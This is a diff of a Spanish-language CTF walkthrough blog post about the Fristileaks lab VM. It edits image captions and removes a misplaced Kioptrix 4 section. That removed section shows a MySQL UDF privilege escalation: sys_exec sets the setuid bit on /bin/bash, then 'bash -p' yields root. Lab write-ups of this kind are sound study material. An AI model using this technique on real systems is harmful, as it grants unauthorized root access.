@@ -136,7 +136,7 @@ Entrando a http://10.0.0.123 se presenta una página de home de login:
 
 ---
 
-![img]({{ '/assets/images/Fristileaks/login_01.png' | relative_url }}){: .center-image }*(Login)*
+![img]({{ '/assets/images/Fristileaks/login_00.png' | relative_url }}){: .center-image }*(Login)*
 
 ---
 
@@ -219,7 +219,7 @@ Y lo siguiente que aparece si abrimos la imágen resultante es el password:
 
 ---
 
-![img]({{ '/assets/images/Fristileaks/password.png' | relative_url }}){: .center-image }*(Hermoso password)*
+![img]({{ '/assets/images/Fristileaks/password.png' | relative_url }}){: .center-image }*(Nanananana)*
 
 ---
 
@@ -232,7 +232,7 @@ Si pruebo de loguearme con esa credenciales tengo éxito y se presenta la siguie
 
 ---
 
-![img]({{ '/assets/images/Fristileaks/upload_00.png' | relative_url }}){: .center-image }*(Nanananana)*
+![img]({{ '/assets/images/Fristileaks/upload_00.png' | relative_url }}){: .center-image }*(Página de Upload)*
 
 ---
 
@@ -244,46 +244,6 @@ Si pruebo de loguearme con esa credenciales tengo éxito y se presenta la siguie
 
 ---
 
-Al final de todo la enumeración no sirvió más que para encontrar que MySQL corre como **root**, me gustaría decir que soy el genio que logró hacer lo que viene a continuación pero no fue más que copy + paste. Los creditos van para:
-
- - [Abatchy](https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub)
- - [Adam Palmer](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)
-
----
-
-```console
-mysql -u root -h localhost
-
-mysql> use mysql;
-mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
-mysql> select sys_exec('chmod u+s /bin/bash');
-
-mysql> exit
-Bye
-john@Kioptrix4:~$ ls -a /bin/bash 
-/bin/bash
-john@Kioptrix4:~$ bash -p
-bash-3.2# whoami
-root
-bash-3.2# cat /root/congrats.txt 
-Congratulations!
-You've got root.
-
-There is more then one way to get root on this system. Try and find them.
-I've only tested two (2) methods, but it doesn't mean there aren't more.
-As always there's an easy way, and a not so easy way to pop this box.
-Look for other methods to get root privileges other than running an exploit.
-
-It took a while to make this. For one it's not as easy as it may look, and
-also work and family life are my priorities. Hobbies are low on my list.
-Really hope you enjoyed this one.
-
-If you haven't already, check out the other VMs available on:
-www.kioptrix.com
-
-Thanks for playing,
-loneferret
-```
 
 ---
 
